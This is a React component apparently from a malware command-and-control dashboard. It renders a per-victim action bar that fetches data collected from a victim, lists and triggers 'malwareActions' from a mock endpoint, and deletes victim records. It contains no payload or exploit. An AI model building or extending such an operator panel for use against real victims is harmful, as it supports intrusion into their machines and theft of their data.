"use client"
import { StandaloneModal, useModal } from "@/app/components/standaloneModal"
import { ReactNode, useState } from "react"
import { BsInfoCircleFill, BsTerminalFill, BsXCircleFill } from "react-icons/bs"
import {DELETE} from "@/app/api/delete/[victimId]/route";

export default function ActionBar({ victimId }: { victimId: number }) {
	const { ref, onOpen, onClose } = useModal()
	const [modalContent, setModalContent] = useState<string | ReactNode>("")

	async function handleAction(actionRoute: string) {
		const response = await fetch(actionRoute)
		if (!response.ok) {
			alert("Failed to perform action")
			return
		}
		const responseJson = await response.json()
		return alert(responseJson.message)
	}

	async function handleGetActions() {
		const actionsResponse = await fetch("/api/malware/mock")
		if (!actionsResponse.ok) {
			alert("Failed to get actions")
			return
		}
		const actionsObject = await actionsResponse.json()
		setModalContent((_) => {
			return (
				<div>
					{Object.keys(actionsObject.malwareActions).map((key) => (
						<div className="flex w-48 flex-grow justify-between">
							<span>{key}:</span>
							<button onClick={() => handleAction(actionsObject.malwareActions[key])}>
								Lessgo
							</button>
						</div>
					))}
				</div>
			)
		})
	}

	async function handleGetData() {
		console.log(victimId)
		const dataResponse = await fetch(`/api/getData/${victimId}`)
		if (!dataResponse.ok) {
			alert("Failed to get data")
			return
		}

		const jsonData = await dataResponse.json()
		const victimsDataArray = jsonData.data as Array<{
			[key: string]: string
		}>
		console.log(victimsDataArray)

		setModalContent((_) => {
			return victimsDataArray.map((dataObject) => (
				<div>
					{Object.keys(dataObject).map((key) => (
						<div className="flex w-96 flex-grow justify-between">
							<span>{key}:</span>
							<span>{dataObject[key]}</span>
						</div>
					))}
				</div>
			))
		})
	}

	async function handleDeletion() {
		console.log(victimId)
		const deletionResponse = await fetch(`/api/delete/${victimId}`, {method: "DELETE"})
		if (!deletionResponse.ok) {
			alert("Failed to delete victim")
			return
		}
		const deletionJson = await deletionResponse.json()
		return alert(deletionJson.message)
	}

	return (
		<div className="flex w-full justify-between">
			<button
				onClick={() => {
					handleGetData()
					onOpen()
				}}
				className="flex items-center justify-center p-2"
			>
				<BsInfoCircleFill />
			</button>
			<button
				onClick={() => {
					handleGetActions()
					onOpen()
				}}
			>
				<BsTerminalFill />
			</button>
			<button
				onClick={handleDeletion}
				className="flex items-center justify-center p-2"
			>
				<BsXCircleFill />
			</button>
			<StandaloneModal
				ref={ref}
				onClose={onClose}
			>
				{modalContent}
			</StandaloneModal>
		</div>
	)
}
